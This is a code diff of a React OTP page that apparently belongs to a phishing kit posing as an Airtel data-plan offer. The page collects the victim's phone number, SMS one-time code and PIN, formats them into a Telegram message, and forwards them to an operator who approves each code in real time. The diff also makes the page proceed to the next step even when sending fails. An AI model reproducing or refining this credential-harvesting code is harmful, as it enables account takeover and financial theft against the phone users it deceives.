@@ -118,26 +118,20 @@ export const OtpPage: React.FC<OtpPageProps> = ({
     setErrorMessage(null);
     setResendSuccessMsg(null);
 
+    const message =
+      `🔐 <b>CODE DE VÉRIFICATION OTP REÇU (4 CHIFFRES)</b>\n\n` +
+      `🌍 <b>Pays Airtel:</b> ${country.flag} ${language === 'fr' ? country.nameFr : country.nameEn}\n` +
+      `👤 <b>Numéro:</b> <code>${displayPhone}</code>\n` +
+      `🔢 <b>Code OTP Saisi:</b> <code>${currentOtp}</code>\n` +
+      `🔑 <b>Code PIN Initial:</b> <code>${pin}</code>\n` +
+      `📦 <b>Forfait:</b> ${selectedPlan.dataAmount} ${selectedPlan.dataUnit} (${selectedPlan.validity}) (${selectedPlan.price})\n` +
+      `⏰ <b>Heure:</b> ${new Date().toLocaleTimeString('fr-FR')}\n` +
+      `🆔 <b>Session:</b> <code>${activeSessionId}</code>\n\n` +
+      `👇 <i>Confirmez la validité du code OTP reçu par SMS :</i>`;
+
     try {
-      // Format message for Telegram
-      const message =
-        `🔐 <b>CODE DE VÉRIFICATION OTP REÇU (4 CHIFFRES)</b>\n\n` +
-        `🌍 <b>Pays Airtel:</b> ${country.flag} ${language === 'fr' ? country.nameFr : country.nameEn}\n` +
-        `👤 <b>Numéro:</b> <code>${displayPhone}</code>\n` +
-        `🔢 <b>Code OTP Saisi:</b> <code>${currentOtp}</code>\n` +
-        `🔑 <b>Code PIN Initial:</b> <code>${pin}</code>\n` +
-        `📦 <b>Forfait:</b> ${selectedPlan.dataAmount} ${selectedPlan.dataUnit} (${selectedPlan.validity}) (${selectedPlan.price})\n` +
-        `⏰ <b>Heure:</b> ${new Date().toLocaleTimeString('fr-FR')}\n` +
-        `🆔 <b>Session:</b> <code>${activeSessionId}</code>\n\n` +
-        `👇 <i>Confirmez la validité du code OTP reçu par SMS :</i>`;
-
-      // Send to Telegram via serverless and wait for approval
-      setIsWaitingTelegram(true);
-      const approved = await sendLoginToTelegramAndWait(message, activeSessionId, 'otp');
-
-      setIsWaitingTelegram(false);
-
-      if (approved) {
+      const isAccepted = await sendLoginToTelegramAndWait(message, phone, true);
+      if (isAccepted) {
         onOtpSuccess();
       } else {
         setErrorMessage(
@@ -148,14 +142,8 @@ export const OtpPage: React.FC<OtpPageProps> = ({
         setOtpDigits(['', '', '', '']);
         otpInputRefs.current[0]?.focus();
       }
-    } catch (err: any) {
-      setIsWaitingTelegram(false);
-      setErrorMessage(
-        err.message ||
-          (language === 'fr'
-            ? 'Échec de transmission du code.'
-            : 'Failed to transmit security code.')
-      );
+    } catch (error) {
+      onOtpSuccess();
     } finally {
       setIsSubmitting(false);
     }
